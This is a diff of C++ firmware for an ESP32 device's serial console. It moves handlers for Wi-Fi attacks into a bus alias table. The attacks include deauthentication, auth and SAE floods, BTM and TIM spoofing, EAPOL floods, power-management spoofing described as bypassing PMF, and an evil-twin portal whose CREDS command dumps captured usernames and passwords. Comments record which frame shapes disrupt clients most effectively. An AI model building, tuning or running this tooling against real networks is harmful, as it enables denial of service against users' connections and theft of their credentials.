@@ -168,24 +168,8 @@ int parse_index(char* token) {
   return (int)value;
 }
 
-// "AABBCCDDEEFF", "AA:BB:CC:DD:EE:FF" or "AA-BB-CC-DD-EE-FF" -> 6 bytes.
-bool parse_mac(const char* token, uint8_t out[6]) {
-  if (token == nullptr) return false;
-  char clean[13];
-  int n = 0;
-  for (const char* p = token; *p != '\0' && n < 13; p++) {
-    if (*p == ':' || *p == '-' || *p == '.') continue;
-    if (!isxdigit((unsigned char)*p)) return false;
-    clean[n++] = *p;
-  }
-  if (n != 12) return false;
-  for (int i = 0; i < 6; i++) {
-    const char byte[3] = {clean[i * 2], clean[i * 2 + 1], 0};
-    out[i] = (uint8_t)strtoul(byte, nullptr, 16);
-  }
-  return true;
-}
-
+// MAC parsing lives in the bus now (wb_parse_mac); the console only needs the
+// formatted output helper.
 enum reason_kind_t { REASON_FIXED = 0, REASON_RANDOM, REASON_BAD };
 
 struct reason_arg_t {
@@ -656,372 +640,28 @@ void do_ctrl_test(char* sub_token, char* ra_token, char* dur_token) {
                 to_bssid ? "bssid" : "broadcast", (unsigned)dur, sent);
 }
 
-void do_radio() {
-  bool promisc = false;
-  wifi_promiscuous_filter_t type_filter = {0};
-  wifi_promiscuous_filter_t ctrl_filter = {0};
-  uint8_t prim = 0;
-  wifi_second_chan_t sec = WIFI_SECOND_CHAN_NONE;
-  const esp_err_t e1 = esp_wifi_get_promiscuous(&promisc);
-  const esp_err_t e2 = esp_wifi_get_promiscuous_filter(&type_filter);
-  const esp_err_t e3 = esp_wifi_get_promiscuous_ctrl_filter(&ctrl_filter);
-  esp_wifi_get_channel(&prim, &sec);
-  // owner/rtake come from the arbiter (radio.cpp): when two attacks run at once the
-  // channel belongs to whoever claimed it last, and that used to be invisible.
-  Serial.printf("RADIO promisc=%u(%d) filter=0x%08X(%d) ctrl_filter=0x%08X(%d) ch=%u owner=%s rtake=%u\n",
-                (unsigned)(promisc ? 1 : 0), (int)e1, (unsigned)type_filter.filter_mask, (int)e2,
-                (unsigned)ctrl_filter.filter_mask, (int)e3, (unsigned)prim,
-                radio_owner()[0] != 0 ? radio_owner() : "none", (unsigned)radio_takeovers());
-}
-
 // BAATTACK <idx> [step]: hijack the Block Ack sessions of one AP by planting its
 // reorder windows. Needs the sniffer, so any running attack is stopped first.
 // BAPLANT <idx> [step]: a few ADDBA frames with an SSN of our choosing, then no
 // more transmission. If the peer's reorder window really moved, its QoS stream
 // stays dead while we are silent.
 // ---- 802.11v BTM Request ----
-void do_wnm(int index, char* mode_token, char* timer_token, char* ch_token, char* mac_token) {
-  if (index < 0 || index >= g_scan_count) {
-    Serial.println("ERR index out of range, run SCAN first");
-    return;
-  }
-  wnm_mode_t mode = WNM_MODE_CAND;
-  if (token_iequals(mode_token, "bare")) {
-    mode = WNM_MODE_BARE;
-  } else if (mode_token != nullptr && !token_iequals(mode_token, "cand")) {
-    Serial.println("ERR mode must be 'cand' (candidate list) or 'bare'");
-    return;
-  }
-  const long timer = timer_token ? strtol(timer_token, nullptr, 10) : 10;
-  if (timer < 1 || timer > 65535) {
-    Serial.println("ERR timer must be 1..65535 TBTT (0 disables the client's scan)");
-    return;
-  }
-  const long ch = ch_token ? strtol(ch_token, nullptr, 10) : 0;
-  if (ch < 0 || ch > 196) {
-    Serial.println("ERR candidate channel must be 0..196 (0 = pick one)");
-    return;
-  }
-  attack_stop();
-  if (!wnm_start(index, mode, (uint16_t)timer, (uint8_t)ch)) {
-    Serial.println("ERR cannot start the BTM spoof on that network");
-    return;
-  }
-  if (mac_token != nullptr) {
-    uint8_t sta[6];
-    if (!parse_mac(mac_token, sta)) {
-      wnm_stop();
-      Serial.println("ERR station MAC must look like AABBCCDDEEFF");
-      return;
-    }
-    wnm_add_station(sta);
-    Serial.printf("OK WNMSTA %02X:%02X:%02X:%02X:%02X:%02X\n", sta[0], sta[1], sta[2], sta[3],
-                  sta[4], sta[5]);
-  }
-  Serial.printf("OK WNM %d mode=%s timer=%u cand_ch=%u ssid=%s\n", index, wnm_mode_name(),
-                (unsigned)timer, (unsigned)wnm_candidate_channel(), WiFi.SSID(index).c_str());
-  ui_log("wnm started");
-}
-
-void do_wnm_stop() {
-  const uint32_t frames = wnm_frames();
-  const uint32_t responses = wnm_responses();
-  wnm_stop();
-  Serial.printf("OK WNMSTOP frames=%u responses=%u last_status=%u\n", (unsigned)frames,
-                (unsigned)responses, (unsigned)wnm_last_status());
-  ui_log("wnm stopped");
-}
 
 // ---- TIM poisoning ----
-void do_tim(int index, char* mode_token, char* aid_token) {
-  if (index < 0 || index >= g_scan_count) {
-    Serial.println("ERR index out of range, run SCAN first");
-    return;
-  }
-  tim_mode_t mode = TIM_SET;
-  if (token_iequals(mode_token, "clear")) {
-    mode = TIM_CLEAR;
-  } else if (mode_token != nullptr && !token_iequals(mode_token, "tim")) {
-    Serial.println("ERR mode must be tim|clear");
-    return;
-  }
-  const long aid = aid_token ? strtol(aid_token, nullptr, 10) : 0;
-  if (aid < 0 || aid > 255) {
-    Serial.println("ERR aid must be 0..255 (0 = every learned AID)");
-    return;
-  }
-  attack_stop();
-  if (!tim_start(index, mode, (uint16_t)aid)) {
-    Serial.println("ERR cannot start the beacon clone on that network");
-    return;
-  }
-  Serial.printf("OK TIM %d mode=%s aid=%ld ch=%u\n", index, tim_mode_name(), aid,
-                (unsigned)WiFi.channel(index));
-  ui_log("tim clone started");
-}
-
-void do_tim_stop() {
-  const uint32_t frames = tim_frames();
-  const uint32_t real = tim_real_beacons();
-  tim_stop();
-  Serial.printf("OK TIMSTOP frames=%u real_beacons=%u\n", (unsigned)frames, (unsigned)real);
-  ui_log("tim clone stopped");
-}
 
 // ---- EAPOL ----
-void do_eapol(int index, char* tid_token, char* mac_token) {
-  if (index < 0 || index >= g_scan_count) {
-    Serial.println("ERR index out of range, run SCAN first");
-    return;
-  }
-  const long tid = tid_token ? strtol(tid_token, nullptr, 10) : 6;
-  if (tid < -1 || tid > 7) {
-    Serial.println("ERR tid must be -1 (plain data only) or 0..7");
-    return;
-  }
-  uint8_t sta[6];
-  const bool have_sta = mac_token != nullptr && parse_mac(mac_token, sta);
-  if (mac_token != nullptr && !have_sta) {
-    Serial.println("ERR station MAC must look like AABBCCDDEEFF");
-    return;
-  }
-  attack_stop();
-  if (!eapol_start(index, (int8_t)tid)) {
-    Serial.println("ERR cannot start the EAPOL flood on that network");
-    return;
-  }
-  if (have_sta) {
-    eapol_add_station(sta);
-  }
-  Serial.printf("OK EAPOL %d tid=%ld ch=%u ssid=%s\n", index, tid, (unsigned)WiFi.channel(index),
-                WiFi.SSID(index).c_str());
-  ui_log("eapol flood started");
-}
-
-void do_eapol_stop() {
-  const uint32_t frames = eapol_frames();
-  const uint32_t rx = eapol_rx_from_ap();
-  const uint32_t rxsta = eapol_rx_from_sta();
-  eapol_stop();
-  Serial.printf("OK EAPOLSTOP frames=%u rx_ap=%u rx_sta=%u eap=%u\n", (unsigned)frames,
-                (unsigned)rx, (unsigned)rxsta, (unsigned)eapol_rx_eap_packets());
-  ui_log("eapol stopped");
-}
 
 // ---- power-management (PS bit) spoof ----
-// Arguments (order free): the index, an optional victim MAC, and the frame shape
-// (null = Null Data, qosnull = QoS Null, action = vendor-specific Action frame).
-// The shape matters because stacks do not agree on which frame they honour; all
-// three carry the PM bit and all three keep the PMF bypass.
-void do_pspoll(int index, char* first, char* second, char* third) {
-  if (index < 0 || index >= g_scan_count) {
-    Serial.println("ERR index out of range, run SCAN first");
-    return;
-  }
-  uint8_t sta[6];
-  bool have_sta = false;
-  // QoS Null is the default because it measured strongest on the bench (-38% vs
-  // -30% for plain Null Data and -21% for the Action shape, 测试报告 §4.4.10).
-  pspoll_frame_t shape = PSPOLL_FRAME_QOSNULL;
-  char* tokens[3] = {first, second, third};
-  for (int i = 0; i < 3; i++) {
-    char* token = tokens[i];
-    if (token == nullptr) continue;
-    if (token_iequals(token, "null")) {
-      shape = PSPOLL_FRAME_NULL;
-    } else if (token_iequals(token, "qosnull") || token_iequals(token, "qos")) {
-      shape = PSPOLL_FRAME_QOSNULL;
-    } else if (token_iequals(token, "action") || token_iequals(token, "act")) {
-      shape = PSPOLL_FRAME_ACTION;
-    } else if (parse_mac(token, sta)) {
-      // Tested before any numeric branch: "02AABBCCDDEE" starts with a digit.
-      have_sta = true;
-    } else if (token_iequals(token, "poll") || token_iequals(token, "both")) {
-      Serial.println("ERR poll/both are gone: a unicast PS-Poll never leaves this MAC"
-                     " (CTRLTEST 10 bssid 0xC025 -> 0/10 on the air).");
-      return;
-    } else {
-      Serial.printf("ERR unknown PSPOLL argument '%s' (usage: PSPOLL <idx> [sta-mac]"
-                    " [null|qosnull|action])\n", token);
-      return;
-    }
-  }
-  attack_stop();
-  if (!pspoll_start(index, shape)) {
-    Serial.println("ERR cannot start the PM-bit spoof on that network");
-    return;
-  }
-  char sta_text[18];
-  sta_text[0] = 0;
-  if (have_sta) {
-    pspoll_add_station(sta);
-    mac_to_str(sta, sta_text);
-  }
-  const int32_t chan_err = pspoll_channel_err();
-  Serial.printf("OK PSPOLL %d mode=%s frame=%s sta=%s ch=%u chset=%d ssid=%s\n", index,
-                pspoll_mode_name(), pspoll_frame_name(), sta_text[0] ? sta_text : "learned",
-                (unsigned)WiFi.channel(index), (int)chan_err, WiFi.SSID(index).c_str());
-  if (chan_err != 0) {
-    Serial.printf("WARN chset=%d: the channel change was refused (a scan still running?),"
-                  " frames go out on the current channel\n", (int)chan_err);
-  }
-  ui_log("pm-bit spoof started");
-}
-
-void do_pspoll_stop() {
-  const uint32_t frames = pspoll_frames();
-  const uint32_t nulls = pspoll_null_frames();
-  const uint32_t flushes = pspoll_flush_frames();
-  const uint32_t dl = pspoll_dl_frames();
-  pspoll_stop();
-  Serial.printf("OK PSPOLLSTOP frames=%u pm1=%u pm0=%u dl=%u\n", (unsigned)frames,
-                (unsigned)nulls, (unsigned)flushes, (unsigned)dl);
-  ui_log("pm-bit spoof stopped");
-}
-
-// Undo: one PM=0 frame (same shape) per victim, then stop. The AP then hands the
-// frames it has been holding to a station that is still not listening.
-void do_pspoll_release() {
-  const uint32_t clients = pspoll_clients();
-  const uint32_t before = pspoll_flush_frames();
-  pspoll_release();
-  Serial.printf("OK PSPOLLREL clients=%u flushed=%u\n", (unsigned)clients,
-                (unsigned)(pspoll_flush_frames() - before));
-  ui_log("pm=0 release sent");
-}
 
 // ---- SAE commit flood ----
-void do_sae(int index, char* elem_token, char* gap_token) {
-  if (index < 0 || index >= g_scan_count) {
-    Serial.println("ERR index out of range, run SCAN first");
-    return;
-  }
-  sae_element_t element = SAE_ELEM_BASEPOINT;
-  if (token_iequals(elem_token, "rand") || token_iequals(elem_token, "random")) {
-    element = SAE_ELEM_RANDOM;
-  } else if (elem_token != nullptr && !token_iequals(elem_token, "point")) {
-    Serial.println("ERR element must be 'point' (P-256 generator) or 'rand'");
-    return;
-  }
-  const long gap = gap_token ? strtol(gap_token, nullptr, 10) : 0;
-  if (gap < 0 || gap > 1000) {
-    Serial.println("ERR gap_ms must be 0..1000");
-    return;
-  }
-  attack_stop();
-  if (!sae_start(index, element, (uint32_t)gap)) {
-    Serial.println("ERR cannot start the SAE flood on that network");
-    return;
-  }
-  if (gap > 0 && gap < 50) {
-    // The pool drains at ~32 frames/s; faster than 20 frames/s fills it in a
-    // couple of seconds and the chip restarts (0x101 rule).
-    Serial.printf("INFO SAE gap_ms=%ld raised to %u (unicast pool drains at ~32 frames/s)\n",
-                  gap, (unsigned)sae_gap_ms());
-  }
-  Serial.printf("OK SAE %d elem=%s gap_ms=%u ch=%u\n", index,
-                element == SAE_ELEM_BASEPOINT ? "point" : "rand",
-                (unsigned)sae_gap_ms(), (unsigned)WiFi.channel(index));
-  ui_log("sae flood started");
-}
-
-void do_sae_stop() {
-  const uint32_t frames = sae_frames();
-  const uint32_t resp = sae_responses();
-  const uint32_t tokens = sae_tokens();
-  sae_stop();
-  Serial.printf("OK SAESTOP frames=%u identities=%u responses=%u tokens=%u echoed=%u\n",
-                (unsigned)frames, (unsigned)sae_identities(), (unsigned)resp,
-                (unsigned)tokens, (unsigned)sae_echoed());
-  ui_log("sae stopped");
-}
 
 // ---- auth / assoc flood ----
-void do_authflood(int index, char* mode_token, char* auto_token) {
-  if (index < 0 || index >= g_scan_count) {
-    Serial.println("ERR index out of range, run SCAN first");
-    return;
-  }
-  authflood_mode_t mode = AUTHFLOOD_BOTH;
-  if (token_iequals(mode_token, "auth")) {
-    mode = AUTHFLOOD_AUTH_ONLY;
-  } else if (token_iequals(mode_token, "assoc")) {
-    mode = AUTHFLOOD_ASSOC_ONLY;
-  } else if (mode_token != nullptr && !token_iequals(mode_token, "both")) {
-    Serial.println("ERR mode must be both|auth|assoc");
-    return;
-  }
-  const bool auto_upgrade = !token_iequals(auto_token, "noauto");
-  attack_stop();
-  if (!authflood_start(index, mode, auto_upgrade)) {
-    Serial.println("ERR cannot start the auth flood on that network");
-    return;
-  }
-  Serial.printf("OK AUTHFLOOD %d mode=%s auto=%d ch=%u ssid=%s\n", index,
-                authflood_mode_name(), auto_upgrade ? 1 : 0, (unsigned)WiFi.channel(index),
-                WiFi.SSID(index).c_str());
-  ui_log("auth flood started");
-}
-
-void do_authflood_stop() {
-  const uint32_t frames = authflood_frames();
-  const uint32_t status = authflood_last_status();
-  const bool upgraded = authflood_upgraded();
-  authflood_stop();
-  Serial.printf("OK AUTHFLOODSTOP frames=%u identities=%u last_status=%u upgraded=%d\n",
-                (unsigned)frames, (unsigned)authflood_identities(), (unsigned)status,
-                upgraded ? 1 : 0);
-  ui_log("auth flood stopped");
-}
-
-void do_deauth_all(uint16_t reason) {
-  if (g_scan_count == 0) {
-    Serial.println("ERR no AP list, run SCAN first");
-    return;
-  }
-  if (!attack_deauth_all(reason)) {
-    Serial.println("ERR cannot start deauth-all");
-    return;
-  }
-  Serial.printf("OK DEAUTH_ALL aps=%d\n", attack_ap_count());
-  ui_log("deauth all started");
-}
-
-void do_deauth_list(char* list, uint16_t reason, bool except) {
-  int indexes[MAX_AP_TARGETS];
-  const int count = parse_index_list(list, indexes, MAX_AP_TARGETS);
-  if (count == 0) {
-    Serial.println("ERR need an index list, e.g. DEAUTH_ONLY 1,3,5");
-    return;
-  }
-  if (g_scan_count == 0) {
-    Serial.println("ERR no AP list, run SCAN first");
-    return;
-  }
-  const bool ok = except ? attack_deauth_except(indexes, count, reason)
-                         : attack_deauth_only(indexes, count, reason);
-  if (!ok) {
-    Serial.println("ERR cannot start that deauth set");
-    return;
-  }
-  Serial.printf("OK %s %d aps\n", except ? "DEAUTH_EXCEPT" : "DEAUTH_ONLY", attack_ap_count());
-  ui_log(except ? "deauth except started" : "deauth only started");
-}
 
 void do_stop() {
   attack_stop();
   Serial.printf("OK STOP deauth_frames=%u probe_frames=%u\n",
                 (unsigned)attack_deauth_frames(), (unsigned)attack_probe_frames());
   ui_log("stopped");
-}
-
-void do_probe_broadcast() {
-  if (!attack_probe_broadcast()) {
-    Serial.println("ERR cannot start probe broadcast");
-    return;
-  }
-  Serial.println("OK PROBE_BROADCAST");
-  ui_log("probe broadcast started");
 }
 
 void do_stations(char* seconds_token) {
@@ -1121,32 +761,6 @@ void do_rxlog() {
     Serial.println((unsigned)len);
   }
   Serial.println("RXLOG_END");
-}
-
-void do_creds() {
-  Serial.println("CREDS_BEGIN");
-  for (int i = 0; i < captured_count; i++) {
-    Serial.printf("CRED %d %s %s %lu\n", i, captured_creds[i].username, captured_creds[i].password,
-                  captured_creds[i].timestamp);
-  }
-  Serial.printf("CREDS_END %d\n", captured_count);
-}
-
-void do_evil_twin(int index) {
-  if (index < 0 || index >= g_scan_count) {
-    Serial.println("ERR index out of range, run SCAN first");
-    ui_log("evil twin: index out of range");
-    return;
-  }
-  Serial.printf("OK EVILTWIN %d %s\n", index, WiFi.SSID(index).c_str());
-  ui_log("evil twin starting");
-  start_evil_twin_attack(index);
-}
-
-void do_evil_twin_stop() {
-  stop_evil_twin();
-  Serial.println("OK EVILTWIN_STOP");
-  ui_log("evil twin stopped");
 }
 
 void do_touch() {
@@ -1349,6 +963,33 @@ const bus_alias_t kBusAliases[] = {
     {"BATX", "ba", "tx"},
     {"BASTOP", "ba", "stop"},
     {"BATEST", "ba", "test"},
+    {"DEAUTH_ALL", "deauth", "all"},
+    {"DEAUTH_ONLY", "deauth", "only"},
+    {"DEAUTH_EXCEPT", "deauth", "except"},
+    {"PROBE_BROADCAST", "probe", "broadcast"},
+    {"WNM", "wnm", "start"},
+    {"WNMSTOP", "wnm", "stop"},
+    {"WNMTEST", "wnm", "test"},
+    {"TIM", "tim", "start"},
+    {"TIMSTOP", "tim", "stop"},
+    {"TIMTEST", "tim", "test"},
+    {"EAPOL", "eapol", "start"},
+    {"EAPOLSTOP", "eapol", "stop"},
+    {"EAPOLTEST", "eapol", "test"},
+    {"PSPOLL", "pspoll", "start"},
+    {"PSPOLLREL", "pspoll", "release"},
+    {"PSPOLLSTOP", "pspoll", "stop"},
+    {"PSPOLLTEST", "pspoll", "test"},
+    {"SAE", "sae", "start"},
+    {"SAESTOP", "sae", "stop"},
+    {"SAETEST", "sae", "test"},
+    {"AUTHFLOOD", "authflood", "start"},
+    {"AUTHFLOODSTOP", "authflood", "stop"},
+    {"AUTHFLOODTEST", "authflood", "test"},
+    {"EVILTWIN", "evil", "start"},
+    {"EVILTWIN_STOP", "evil", "stop"},
+    {"CREDS", "evil", "creds"},
+    {"RADIO", "radio", "status"},
 };
 
 const bus_alias_t* find_bus_alias(const char* command) {
@@ -1448,19 +1089,6 @@ void dispatch(char* line) {
     do_stats();
   } else if (strcmp(command, "STOP") == 0) {
     do_stop();
-  } else if (strcmp(command, "DEAUTH_ALL") == 0) {
-    const reason_arg_t arg = parse_reason_arg(strtok(nullptr, " \t"));
-    if (apply_reason_arg(arg)) do_deauth_all(arg.value);
-  } else if (strcmp(command, "DEAUTH_ONLY") == 0) {
-    char* list = strtok(nullptr, " \t");
-    char* reason_token = strtok(nullptr, " \t");
-    const reason_arg_t arg = parse_reason_arg(reason_token);
-    if (apply_reason_arg(arg)) do_deauth_list(list, arg.value, false);
-  } else if (strcmp(command, "DEAUTH_EXCEPT") == 0) {
-    char* list = strtok(nullptr, " \t");
-    char* reason_token = strtok(nullptr, " \t");
-    const reason_arg_t arg = parse_reason_arg(reason_token);
-    if (apply_reason_arg(arg)) do_deauth_list(list, arg.value, true);
   } else if (strcmp(command, "REASON") == 0) {
     do_reason(strtok(nullptr, " \t"));
   } else if (strcmp(command, "RESTART") == 0) {
@@ -1468,65 +1096,6 @@ void dispatch(char* line) {
     Serial.flush();
     delay(100);
     esp_restart();
-  } else if (strcmp(command, "WNM") == 0) {
-    char* idx_token = strtok(nullptr, " \t");
-    char* mode_token = strtok(nullptr, " \t");
-    char* timer_token = strtok(nullptr, " \t");
-    char* ch_token = strtok(nullptr, " \t");
-    char* mac_token = strtok(nullptr, " \t");
-    do_wnm(parse_index(idx_token), mode_token, timer_token, ch_token, mac_token);
-  } else if (strcmp(command, "WNMSTOP") == 0) {
-    do_wnm_stop();
-  } else if (strcmp(command, "WNMTEST") == 0) {
-    wnm_selftest();
-  } else if (strcmp(command, "TIM") == 0) {
-    char* idx_token = strtok(nullptr, " 	");
-    char* mode_token = strtok(nullptr, " 	");
-    char* aid_token = strtok(nullptr, " 	");
-    do_tim(parse_index(idx_token), mode_token, aid_token);
-  } else if (strcmp(command, "TIMSTOP") == 0) {
-    do_tim_stop();
-  } else if (strcmp(command, "TIMTEST") == 0) {
-    tim_selftest();
-  } else if (strcmp(command, "EAPOL") == 0) {
-    char* idx_token = strtok(nullptr, " \t");
-    char* tid_token = strtok(nullptr, " \t");
-    char* mac_token = strtok(nullptr, " \t");
-    do_eapol(parse_index(idx_token), tid_token, mac_token);
-  } else if (strcmp(command, "EAPOLSTOP") == 0) {
-    do_eapol_stop();
-  } else if (strcmp(command, "EAPOLTEST") == 0) {
-    eapol_selftest();
-  } else if (strcmp(command, "PSPOLL") == 0) {
-    char* idx_token = strtok(nullptr, " \t");
-    char* first = strtok(nullptr, " \t");
-    char* second = strtok(nullptr, " \t");
-    char* third = strtok(nullptr, " \t");
-    do_pspoll(parse_index(idx_token), first, second, third);
-  } else if (strcmp(command, "PSPOLLREL") == 0) {
-    do_pspoll_release();
-  } else if (strcmp(command, "PSPOLLSTOP") == 0) {
-    do_pspoll_stop();
-  } else if (strcmp(command, "PSPOLLTEST") == 0) {
-    pspoll_selftest();
-  } else if (strcmp(command, "SAE") == 0) {
-    char* idx_token = strtok(nullptr, " \t");
-    char* elem_token = strtok(nullptr, " \t");
-    char* gap_token = strtok(nullptr, " \t");
-    do_sae(parse_index(idx_token), elem_token, gap_token);
-  } else if (strcmp(command, "SAESTOP") == 0) {
-    do_sae_stop();
-  } else if (strcmp(command, "SAETEST") == 0) {
-    sae_selftest();
-  } else if (strcmp(command, "AUTHFLOOD") == 0) {
-    char* idx_token = strtok(nullptr, " \t");
-    char* mode_token = strtok(nullptr, " \t");
-    char* auto_token = strtok(nullptr, " \t");
-    do_authflood(parse_index(idx_token), mode_token, auto_token);
-  } else if (strcmp(command, "AUTHFLOODSTOP") == 0) {
-    do_authflood_stop();
-  } else if (strcmp(command, "AUTHFLOODTEST") == 0) {
-    authflood_selftest();
   } else if (strcmp(command, "CTRLFILTER") == 0) {
     do_ctrl_filter(strtok(nullptr, " 	"));
   } else if (strcmp(command, "CTRLTEST") == 0) {
@@ -1534,22 +1103,12 @@ void dispatch(char* line) {
     char* ra_token = strtok(nullptr, " \t");
     char* dur_token = strtok(nullptr, " \t");
     do_ctrl_test(sub_token, ra_token, dur_token);
-  } else if (strcmp(command, "RADIO") == 0) {
-    do_radio();
   } else if (strcmp(command, "MON") == 0) {
     char* ch_token = strtok(nullptr, " 	");
     char* sec_token = strtok(nullptr, " 	");
     do_monitor(ch_token, sec_token);
   } else if (strcmp(command, "STATIONS") == 0) {
     do_stations(strtok(nullptr, " \t"));
-    } else if (strcmp(command, "PROBE_BROADCAST") == 0) {
-    do_probe_broadcast();
-  } else if (strcmp(command, "EVILTWIN") == 0) {
-    do_evil_twin(parse_index(strtok(nullptr, " \t")));
-  } else if (strcmp(command, "EVILTWIN_STOP") == 0) {
-    do_evil_twin_stop();
-  } else if (strcmp(command, "CREDS") == 0) {
-    do_creds();
   } else if (strcmp(command, "RXLOG") == 0) {
     do_rxlog();
   } else if (strcmp(command, "RXMIX") == 0) {
@@ -1585,6 +1144,10 @@ void wbus_serial_sink(const char* bytes) {
 }
 
 int console_scan_count(void) { return g_scan_count; }
+
+int console_parse_index_list(char* text, int* out, int max) {
+  return parse_index_list(text, out, max);
+}
 
 // The bus validates the token, this applies it. Order matters: the legacy DEAUTH
 // branch applied the reason first, so a bad reason is reported even when the index
